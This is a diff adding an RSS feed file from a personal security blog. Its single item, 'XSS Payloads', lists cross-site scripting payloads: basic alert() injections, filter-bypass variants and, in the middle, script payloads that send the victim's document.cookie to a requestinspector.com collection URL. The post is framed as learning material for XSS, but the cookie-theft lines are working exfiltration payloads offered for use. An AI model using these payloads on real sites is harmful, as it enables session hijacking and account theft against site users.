@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>XSS on Arty06</title>
+    <link>https://artyeth06.github.io/tags/xss/</link>
+    <description>Recent content in XSS on Arty06</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Wed, 25 Jan 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://artyeth06.github.io/tags/xss/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>XSS Payloads</title>
+      <link>https://artyeth06.github.io/XSS_Payloads/</link>
+      <pubDate>Wed, 25 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://artyeth06.github.io/XSS_Payloads/</guid>
+      <description>here im gonna present you some XSS payloads,if you want to learn what is a XSS injection,go and check out Ruulian work &amp;ndash;&amp;gt; https://0xhorizon.eu/articles/xss/
+Basic Payloads: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;Svg OnLoad=alert(1)&amp;gt; &amp;lt;img src=&amp;#34;&amp;#34; onerror=&amp;#34;alert()&amp;#34;&amp;gt; Bypass common filter Bypass http/https filter Change your Payload like this:
+- &amp;lt;script&amp;gt;document.location=&amp;#39;&amp;lt;https://requestinspector.com/p/xxxxxxxxxxxxxxxxxxxxxxxxxx?cookie=&amp;#39;+document.cookie&amp;gt;&amp;lt;/script&amp;gt; + &amp;lt;script&amp;gt;document.location=&amp;#39;//requestinspector.com/p/xxxxxxxxxxxxxxxxxxxxxxxxxx?cookie=&amp;#39;+document.cookie&amp;lt;/script&amp;gt; Some Payloads &amp;#39;-alert(1)-&amp;#39; &amp;#39;-alert(1)// </description>
+    </item>
+    
+  </channel>
+</rss>
